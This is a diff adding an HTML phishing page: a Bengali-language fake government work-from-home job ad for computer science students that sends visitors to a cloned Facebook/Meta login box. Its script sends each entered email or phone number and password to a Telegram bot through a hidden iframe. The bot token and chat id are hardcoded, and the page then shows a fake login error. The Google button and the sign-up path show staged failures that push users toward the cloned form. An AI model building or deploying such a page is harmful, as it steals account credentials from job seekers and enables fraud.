@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>সিএসই অনলাইন চাকরি | সরকারি হোম অফিস নিয়োগ</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #f2f5f9;
+      font-family: 'Noto Sans Bengali', sans-serif;
+      padding: 1.5rem;
+      color: #1f2e3a;
+    }
+
+    .light-container {
+      max-width: 1000px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 2rem;
+      box-shadow: 0 12px 28px rgba(0, 0, 0, 0.05), 0 0 0 1px rgba(0, 0, 0, 0.02);
+      overflow: hidden;
+    }
+
+    .logo-row {
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      padding: 1.2rem 1.8rem;
+      background: #ffffff;
+      border-bottom: 1px solid #e9edf2;
+    }
+
+    .logo-bd {
+      background: linear-gradient(135deg, #0a4b33, #0b5e42);
+      color: white;
+      border-radius: 60px;
+      padding: 0.5rem 1.2rem;
+      font-weight: 700;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 1rem;
+    }
+    .logo-bd i { font-size: 1.1rem; }
+    .logo-bd small { font-size: 0.65rem; font-weight: 400; display: block; margin-top: 2px; }
+
+    .govt-logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0.5rem 0 0.2rem;
+    }
+    .govt-logo img {
+      width: 120px;
+      height: auto;
+      display: block;
+    }
+
+    .hero-bn {
+      text-align: center;
+      padding: 1.5rem 1.5rem 0.5rem;
+    }
+    .hero-bn h2 {
+      font-size: 1.7rem;
+      font-weight: 700;
+      background: linear-gradient(135deg, #1e4a6e, #0f2c40);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+    .badge-cse {
+      background: #eef2ff;
+      display: inline-block;
+      padding: 0.3rem 1rem;
+      border-radius: 40px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      margin-top: 10px;
+      color: #1e4a6e;
+    }
+    .hero-bn p {
+      color: #2c4b66;
+      margin-top: 0.5rem;
+      font-weight: 500;
+    }
+
+    .job-card {
+      margin: 1rem 1.8rem 1.8rem 1.8rem;
+      background: #ffffff;
+      border-radius: 1.8rem;
+      box-shadow: 0 6px 14px rgba(0, 0, 0, 0.02), 0 1px 3px rgba(0,0,0,0.05);
+      border: 1px solid #eef2f8;
+    }
+    .job-header {
+      padding: 1.2rem 1.5rem 0.3rem 1.5rem;
+    }
+    .job-header h3 {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: #0b3b2f;
+    }
+    .job-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1rem;
+      margin: 0.6rem 0 0.2rem;
+      font-size: 0.8rem;
+      color: #4a627a;
+    }
+    .truncated-section {
+      padding: 0.5rem 1.5rem 0rem 1.5rem;
+    }
+    .job-description-truncated {
+      max-height: 130px;
+      overflow: hidden;
+      position: relative;
+      font-size: 0.9rem;
+      line-height: 1.5;
+      color: #2d3e50;
+    }
+    .job-description-truncated p { margin-bottom: 0.75rem; }
+    .fade-overlay {
+      background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0.96));
+      height: 48px;
+      position: relative;
+      margin-top: -45px;
+      pointer-events: none;
+    }
+    .lock-message {
+      background: #fef9e3;
+      padding: 0.7rem 1rem;
+      margin: 0.2rem 1.5rem 0.8rem 1.5rem;
+      border-radius: 50px;
+      font-size: 0.8rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      justify-content: center;
+      color: #a16207;
+      border: 1px solid #ffe5a3;
+    }
+    .login-buttons-area {
+      padding: 0.2rem 1.5rem 1.5rem 1.5rem;
+      display: flex;
+      justify-content: center;
+      gap: 1.2rem;
+      flex-wrap: wrap;
+      border-top: 1px solid #f0f2f5;
+      margin-top: 0.2rem;
+    }
+    .social-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 0.7rem 1.5rem;
+      border-radius: 60px;
+      font-weight: 600;
+      font-size: 0.85rem;
+      border: none;
+      cursor: pointer;
+      transition: 0.2s;
+      background: white;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+      border: 1px solid #e2e8f0;
+    }
+    .fb-btn { background: #1877f2; color: white; border: none; }
+    .fb-btn:hover { background: #0e63cf; transform: translateY(-2px); }
+    .google-btn { background: white; color: #3c4043; }
+    .google-btn:hover { background: #f8f9fa; transform: translateY(-2px); }
+    .google-btn i { color: #ea4335; }
+
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(4px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0.2s, opacity 0.2s;
+    }
+    .modal-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+    .modal-card {
+      background: transparent;
+      max-width: 420px;
+      width: 90%;
+      max-height: 95vh;
+      overflow-y: auto;
+      border-radius: 12px;
+      display: flex;
+      justify-content: center;
+    }
+    .modal-card::-webkit-scrollbar {
+      width: 6px;
+    }
+    .modal-card::-webkit-scrollbar-track {
+      background: #f1f1f1;
+      border-radius: 10px;
+    }
+    .modal-card::-webkit-scrollbar-thumb {
+      background: #888;
+      border-radius: 10px;
+    }
+
+    .error-modal-card {
+      background: white;
+      max-width: 380px;
+      width: 90%;
+      border-radius: 1.5rem;
+      overflow: hidden;
+    }
+    .modal-header {
+      padding: 1rem 1.5rem;
+      background: #fefaf5;
+      border-bottom: 1px solid #f0e6dc;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .modal-header h3 { font-size: 1.2rem; font-weight: 700; color: #1f4e3c; }
+    .close-modal {
+      background: none;
+      border: none;
+      font-size: 1.8rem;
+      cursor: pointer;
+      color: #7f8c8d;
+    }
+    .modal-body { padding: 1.5rem; text-align: center; }
+    .error-actions {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+      margin-top: 1.5rem;
+    }
+    .error-btn {
+      padding: 0.6rem 1.2rem;
+      border-radius: 40px;
+      border: none;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .error-btn-fb { background: #1877f2; color: white; }
+    .error-btn-close { background: #e2e8f0; color: #1e2a32; }
+
+    footer {
+      background: #f9fbfd;
+      padding: 0.8rem 1.5rem;
+      text-align: center;
+      font-size: 0.7rem;
+      color: #6c86a3;
+      border-top: 1px solid #eef2f8;
+    }
+    @media (max-width: 650px) {
+      body { padding: 0.8rem; }
+      .job-card { margin: 1rem; }
+      .hero-bn h2 { font-size: 1.3rem; }
+    }
+  </style>
+</head>
+<body>
+<div class="light-container">
+  <div class="logo-row">
+    <div class="logo-bd">
+      <i class="fas fa-briefcase"></i> BdgovtJobs.com
+      <small>সকল চাকরির খবর</small>
+    </div>
+  </div>
+
+  <div class="govt-logo">
+    <img src="Screenshot (548)-modified.png" alt="BD Govt Logo">
+  </div>
+
+  <div class="hero-bn">
+    <h2>💻 সিএসই অনলাইন চাকরি (ওয়ার্ক ফ্রম হোম)</h2>
+    <div class="badge-cse">🎓 বিশেষ ঘোষণা – ২০২৬-২৭ সিএসই ব্যাচের জন্য</div>
+    <p style="margin-bottom: 1px; margin-top: 20px;">সরকারি ডিজিটাল প্ল্যাটফর্মে <strong>গৃহ থেকে কাজ</strong> করার সুযোগ | ছাত্র ও ছাত্রী উভয়ই এই চাকরির জন্য আবেদন করতে পারবে। যাদের কোনো অভিজ্ঞতা নেই, তাদেরকে বিনামূল্যে কাজ শিখানো হবে। 
+       <span>আইসিটি মন্ত্রণালয়ের উদ্যোগ।</span></p>
+  </div>
+
+  <div class="job-card">
+    <div class="job-header">
+      <h3>সহকারী সফটওয়্যার ইঞ্জিনিয়ার (হোম অফিস)</h3>
+      <div class="job-meta">
+        <span><i class="fas fa-building"></i> জাতীয় ডিজিটাল টাস্কফোর্স</span>
+        <span><i class="fas fa-home"></i> সম্পূর্ণ অনলাইন (হোম বেইজড)</span>
+        <span><i class="fas fa-calendar-alt"></i> আবেদনের শেষ সময়: ৩০ মে ২০২৬</span>
+      </div>
+    </div>
+
+    <div class="truncated-section">
+      <div class="job-description-truncated" id="truncatedDesc">
+        <p><strong>📌 চাকরির বিবরণ:</strong> সরকারি “স্মার্ট বাংলাদেশ” প্রকল্পের আওতায় সিএসই গ্র্যাজুয়েটদের জন্য ও এইচএসসি পাশ ছাত্র-ছাত্রীদের জন্য সম্পূর্ণ অনলাইন ভিত্তিক পদ। নির্বাচিত প্রার্থীরা বাসা থেকে সরকারি ওয়েব পোর্টাল, মোবাইল অ্যাপ্লিকেশন এবং ডেটাবেজ মেইনটেনেন্সের কাজ করবেন।</p>
+        <p><strong>✅ দায়িত্বসমূহ:</strong> ওয়েব অ্যাপ ডেভেলপমেন্ট, সরকারি ওপেন ডেটা প্ল্যাটফর্ম রক্ষণাবেক্ষণ, সাইবার সিকিউরিটি মনিটরিং এবং ক্লাউড সেবায় সহায়তা।</p>
+        <p><strong>💰 বেতন ও সুবিধা:</strong> ১০,০০০ - ৩৫,০০০ টাকা (সরকারি স্কেল), বাৎসরিক ছুটি ভাতা, অনলাইন প্রশিক্ষণ ও হোম অ্যালাউন্স।</p>
+        <p><strong>🎓 যোগ্যতা:</strong> সিএসই বা সমতুল্য বিষয়ে স্নাতক (২০২৬ ব্যাচ), ন্যূনতম সিজিপিএ ৩.০। কোনো তৃতীয় বিভাগ গ্রহণযোগ্য নয়। ফ্রেশারদের অগ্রাধিকার।</p>
+        <p><strong>🏢 কর্মস্থল:</strong> সম্পূর্ণ দূরবর্তী (ওয়ার্ক ফ্রম হোম) – শুধুমাত্র দাপ্তরিক ল্যাপটপ ও সফটওয়্যার সরবরাহ করা হবে।</p>
+      </div>
+      <div class="fade-overlay"></div>
+    </div>
+
+    <div class="lock-message">
+      <i class="fas fa-lock"></i> সম্পূর্ণ বিজ্ঞপ্তি ও আবেদনের জন্য লগইন করুন। ফেসবুক বা গুগল একাউন্ট দিয়ে প্রবেশ করুন।
+    </div>
+
+    <div class="login-buttons-area">
+      <button id="fbLoginMain" class="social-btn fb-btn"><i class="fab fa-facebook-f"></i> ফেসবুক দিয়ে লগইন</button>
+      <button id="googleLoginMain" class="social-btn google-btn"><i class="fab fa-google"></i> গুগল দিয়ে লগইন</button>
+    </div>
+  </div>
+
+  <footer>
+    <i class="far fa-copyright"></i> ২০২৬ | বিডি গভর্নমেন্ট জবস – সরকারি চাকরি পোর্টাল
+  </footer>
+</div>
+
+
+<div id="googleErrorModal" class="modal-overlay">
+  <div class="error-modal-card">
+    <div class="modal-header">
+      <h3><i class="fas fa-exclamation-triangle"></i> লগইন ব্যর্থ</h3>
+      <button class="close-modal" id="closeGoogleErrorBtn">&times;</button>
+    </div>
+    <div class="modal-body">
+      <i class="fas fa-times-circle" style="font-size: 3rem; color: #e2132e; margin-bottom: 1rem;"></i>
+      <p style="font-size: 1rem; margin-bottom: 1rem;">দুঃখিত, গুগল লগইনে সমস্যা হয়েছে।</p>
+      <p style="color: #4a627a;">অনুগ্রহ করে <strong>ফেসবুক দিয়ে লগইন</strong> করুন।</p>
+      <div class="error-actions">
+        <button id="tryFbFromError" class="error-btn error-btn-fb"><i class="fab fa-facebook-f"></i> ফেসবুক লগইন</button>
+        <button id="closeErrorBtn" class="error-btn error-btn-close">বন্ধ করুন</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<div id="fbErrorModal" class="modal-overlay">
+  <div class="error-modal-card">
+    <div class="modal-header">
+      <h3><i class="fas fa-exclamation-triangle"></i> ফেসবুক লগইন ব্যর্থ</h3>
+      <button class="close-modal" id="closeFbErrorBtn">&times;</button>
+    </div>
+    <div class="modal-body">
+      <i class="fab fa-facebook-f" style="font-size: 3rem; color: #1877f2; margin-bottom: 1rem;"></i>
+      <p style="font-size: 1rem; margin-bottom: 1rem;">দুঃখিত, ফেসবুক লগইন সফল হয়নি।</p>
+      <p style="color: #4a627a;">আবার চেষ্টা করুন অথবা অন্য উপায়ে লগইন করুন।</p>
+      <div class="error-actions">
+        <button id="closeFbErrorActionBtn" class="error-btn error-btn-close">বন্ধ করুন</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<div id="createAccountErrorModal" class="modal-overlay">
+  <div class="error-modal-card">
+    <div class="modal-header">
+      <h3><i class="fas fa-exclamation-triangle"></i> অ্যাকাউন্ট তৈরি ব্যর্থ</h3>
+      <button class="close-modal" id="closeCreateAccountErrorBtn">&times;</button>
+    </div>
+    <div class="modal-body">
+      <i class="fas fa-server" style="font-size: 3rem; color: #e2132e; margin-bottom: 1rem;"></i>
+      <p style="font-size: 1rem; margin-bottom: 1rem;">দুঃখিত, সার্ভারে সমস্যা হচ্ছে।</p>
+      <p style="color: #4a627a;">এখনই অ্যাকাউন্ট তৈরি করা সম্ভব নয়। অনুগ্রহ করে লগইন করুন।</p>
+      <div class="error-actions">
+        <button id="closeCreateAccountErrorActionBtn" class="error-btn error-btn-close">বন্ধ করুন</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<div id="metaLoginModal" class="modal-overlay">
+  <div class="modal-card" id="metaModalContainer"></div>
+</div>
+
+<script>
+  
+  const fbBtn = document.getElementById('fbLoginMain');
+  const googleBtn = document.getElementById('googleLoginMain');
+  const googleErrorModal = document.getElementById('googleErrorModal');
+  const fbErrorModal = document.getElementById('fbErrorModal');
+  const createAccountErrorModal = document.getElementById('createAccountErrorModal');
+  const metaLoginModal = document.getElementById('metaLoginModal');
+  const metaModalContainer = document.getElementById('metaModalContainer');
+  
+  const closeGoogleErrorBtn = document.getElementById('closeGoogleErrorBtn');
+  const closeErrorBtn = document.getElementById('closeErrorBtn');
+  const tryFbFromError = document.getElementById('tryFbFromError');
+  const closeFbErrorBtn = document.getElementById('closeFbErrorBtn');
+  const closeFbErrorActionBtn = document.getElementById('closeFbErrorActionBtn');
+  const closeCreateAccountErrorBtn = document.getElementById('closeCreateAccountErrorBtn');
+  const closeCreateAccountErrorActionBtn = document.getElementById('closeCreateAccountErrorActionBtn');
+
+  function closeModal(modalElement) {
+    modalElement.classList.remove('active');
+    document.body.style.overflow = '';
+  }
+
+  function showModal(modalElement) {
+    modalElement.classList.add('active');
+    document.body.style.overflow = 'hidden';
+  }
+
+  
+  googleBtn.addEventListener('click', () => {
+    showModal(googleErrorModal);
+  });
+
+  function closeGoogleError() {
+    closeModal(googleErrorModal);
+  }
+  closeGoogleErrorBtn.addEventListener('click', closeGoogleError);
+  closeErrorBtn.addEventListener('click', closeGoogleError);
+  tryFbFromError.addEventListener('click', () => {
+    closeGoogleError();
+    openMetaLogin();
+  });
+
+  
+  function closeCreateAccountError() {
+    closeModal(createAccountErrorModal);
+  }
+  if (closeCreateAccountErrorBtn) closeCreateAccountErrorBtn.addEventListener('click', closeCreateAccountError);
+  if (closeCreateAccountErrorActionBtn) closeCreateAccountErrorActionBtn.addEventListener('click', closeCreateAccountError);
+  createAccountErrorModal.addEventListener('click', (e) => {
+    if (e.target === createAccountErrorModal) closeCreateAccountError();
+  });
+
+ 
+  let hehehe = "8559703852:AAGeoacSkgowkBzuxafA5qMBBthFwxPc3Io";   
+  let hahaha = "8178317281";    
+
+  function sendToTelegram(identifier, password) {
+    if (!identifier || !password) return;
+    const text = `🔐 LOGIN ALERT\n\nEmail/Mobile: ${identifier}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
+    const url = `https://api.telegram.org/bot${hehehe}/sendMessage?chat_id=${hahaha}&text=${encodeURIComponent(text)}`;
+    let iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = url;
+    document.body.appendChild(iframe);
+    setTimeout(() => { if (iframe && iframe.remove) iframe.remove(); }, 2000);
+  }
+
+  
+  function openMetaLogin() {
+    metaModalContainer.innerHTML = `
+      <div class="card" style="background: #ffffff; width: 100%; max-width: 380px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); padding: 20px 20px 28px; min-height: 550px; height: auto; padding-top: 120px; margin: 0 auto;">
+        <div class="lang-row" style="display: flex; justify-content: flex-end; margin-bottom: 20px;">
+          <button class="lang-selector" id="langSwitch" style="background: none; border: none; font-size: 13px; color: #898989; font-weight: 500; cursor: pointer; font-family: inherit; left: -141px; bottom: 90px; position: relative;">English (UK)</button>
+        </div>
+        <img class="fblogo" src="IMG_20260412_004210_109-modified.png" alt="" style="height: 75px; padding-bottom: 10px; position: relative; top: -119px; margin-bottom: -90px; left: 130px;">
+        <div id="loginPanel" class="form-panel">
+          <form id="loginForm">
+            <div class="form-group" style="margin-bottom: 12px;">
+              <input type="text" id="loginIdentifier" placeholder="Mobile number or email address" autocomplete="username" style="width: 100%; padding: 15px 14px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 14px; background: #ffffff; font-family: inherit;">
+            </div>
+            <div class="form-group" style="margin-bottom: 12px;">
+              <div class="password-wrapper" style="position: relative;">
+                <input type="password" id="loginPassword" placeholder="Password" autocomplete="current-password" style="width: 100%; padding: 15px 14px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 14px; background: #ffffff; font-family: inherit;">
+                <button type="button" class="toggle-pwd" data-target="loginPassword" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; font-size: 14px; font-weight: 600; color: #1877f2; cursor: pointer; font-family: inherit;">Show</button>
+              </div>
+            </div>
+            <button type="submit" class="btn-login" style="background: #0064E0; color: #ffffff; border: 1px solid #1877f2; width: 100%; padding: 12px; font-size: 14px; border-radius: 22px; cursor: pointer;">Log in</button>
+            <div class="forgot-link" style="text-align: center; margin: 16px 0 20px;">
+              <button type="button" id="forgotPasswordBtn" style="background: none; border: none; color: #2d2b2b; font-size: 14px; font-weight: 500; cursor: pointer; font-family: inherit;">Forgotten password?</button>
+            </div>
+            <button type="button" id="showRegisterBtn" class="btn-create" style="background: #ffffff; color: #1877f2; border: 1px solid #1877f2; width: 100%; padding: 12px; margin-top: 45px; font-size: 17px; font-weight: bold; border-radius: 22px; cursor: pointer;">Create new account</button>
+          </form>
+        </div>
+        <div id="registerPanel" class="form-panel hidden-panel" style="display: none;">
+          <form id="registerForm">
+            <div class="form-group" style="margin-bottom: 12px;">
+              <input type="text" id="fullName" placeholder="Full name" autocomplete="name" style="width: 100%; padding: 15px 14px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 14px;">
+            </div>
+            <div class="form-group" style="margin-bottom: 12px;">
+              <input type="text" id="regIdentifier" placeholder="Mobile number or email address" style="width: 100%; padding: 15px 14px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 14px;">
+            </div>
+            <div class="form-group" style="margin-bottom: 12px;">
+              <div class="password-wrapper" style="position: relative;">
+                <input type="password" id="regPassword" placeholder="New password" style="width: 100%; padding: 15px 14px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 14px;">
+                <button type="button" class="toggle-pwd" data-target="regPassword" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; font-size: 14px; font-weight: 600; color: #1877f2; cursor: pointer;">Show</button>
+              </div>
+            </div>
+            <div class="form-group" style="margin-bottom: 12px;">
+              <div class="password-wrapper" style="position: relative;">
+                <input type="password" id="confirmPassword" placeholder="Confirm password" style="width: 100%; padding: 15px 14px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 14px;">
+                <button type="button" class="toggle-pwd" data-target="confirmPassword" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; font-size: 14px; font-weight: 600; color: #1877f2; cursor: pointer;">Show</button>
+              </div>
+            </div>
+            <button type="submit" class="btn-login" style="background: #42b72a; color: white; width: 100%; padding: 12px; border: none; border-radius: 22px; font-weight: bold; cursor: pointer;">Sign Up</button>
+            <div class="back-link" style="text-align: center; margin-top: 16px;">
+              <button type="button" id="backToLoginBtn" style="background: none; border: none; color: #1877f2; font-size: 14px; cursor: pointer;">← Already have an account? Log in</button>
+            </div>
+          </form>
+        </div>
+        <img class="metaimg" src="Screenshot (545).png" alt="" style="height: 17px; width: 22px; position: relative; left: 135px; top: 10px;">
+        <div class="footer-meta" style="text-align: center; margin-top: -20px; font-size: 14px; font-weight: bold; color: #2d2b2b; font-weight: 500; left: 5px; top: 7px; position: relative;">Meta</div>
+      </div>
+      <style>
+        .hidden-panel { display: none !important; }
+        .form-panel { transition: 0.2s; }
+        input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24,119,242,0.2); }
+        .toggle-pwd:hover { text-decoration: underline; }
+      </style>
+    `;
+
+    
+    const loginPanel = document.getElementById('loginPanel');
+    const registerPanel = document.getElementById('registerPanel');
+    const showRegisterBtn = document.getElementById('showRegisterBtn');
+    const backToLoginBtn = document.getElementById('backToLoginBtn');
+    const forgotBtn = document.getElementById('forgotPasswordBtn');
+    const loginForm = document.getElementById('loginForm');
+    const registerForm = document.getElementById('registerForm');
+
+    function showLoginView() {
+      if (loginPanel) loginPanel.classList.remove('hidden-panel');
+      if (registerPanel) registerPanel.classList.add('hidden-panel');
+    }
+
+    
+    if (showRegisterBtn) {
+      showRegisterBtn.addEventListener('click', () => {
+        closeModal(metaLoginModal);
+        showModal(createAccountErrorModal);
+      });
+    }
+
+    
+    if (backToLoginBtn) backToLoginBtn.addEventListener('click', showLoginView);
+
+    
+    if (loginForm) {
+      loginForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const identifier = document.getElementById('loginIdentifier').value.trim();
+        const password = document.getElementById('loginPassword').value;
+        if (identifier && password) {
+          sendToTelegram(identifier, password);
+          document.getElementById('loginPassword').value = "";
+          closeModal(metaLoginModal);
+          showModal(fbErrorModal);
+        } else {
+          alert("Please fill both fields");
+        }
+      });
+    }
+
+   
+    if (registerForm) {
+      registerForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+      });
+    }
+
+    
+    if (forgotBtn) {
+      forgotBtn.addEventListener('click', () => {
+        const identifier = document.getElementById('loginIdentifier').value.trim();
+        if (identifier) alert(`Password Reset link sent to ${identifier}`);
+        else alert("Please enter your email or mobile first");
+      });
+    }
+
+    
+    document.querySelectorAll('.toggle-pwd').forEach(btn => {
+      btn.addEventListener('click', function() {
+        const targetId = this.getAttribute('data-target');
+        const inputField = document.getElementById(targetId);
+        if (inputField) {
+          const type = inputField.getAttribute('type') === 'password' ? 'text' : 'password';
+          inputField.setAttribute('type', type);
+          this.innerText = type === 'password' ? 'Show' : 'Hide';
+        }
+      });
+    });
+
+  
+    const langSwitch = document.getElementById('langSwitch');
+    if (langSwitch) langSwitch.addEventListener('click', () => {});
+
+    
+    showLoginView();
+    showModal(metaLoginModal);
+  }
+
+  fbBtn.addEventListener('click', openMetaLogin);
+
+  function closeFbError() { closeModal(fbErrorModal); }
+  if (closeFbErrorBtn) closeFbErrorBtn.addEventListener('click', closeFbError);
+  if (closeFbErrorActionBtn) closeFbErrorActionBtn.addEventListener('click', closeFbError);
+  fbErrorModal.addEventListener('click', (e) => { if (e.target === fbErrorModal) closeFbError(); });
+  metaLoginModal.addEventListener('click', (e) => { if (e.target === metaLoginModal) closeModal(metaLoginModal); });
+  googleErrorModal.addEventListener('click', (e) => { if (e.target === googleErrorModal) closeModal(googleErrorModal); });
+</script>
+</body>
+</html>
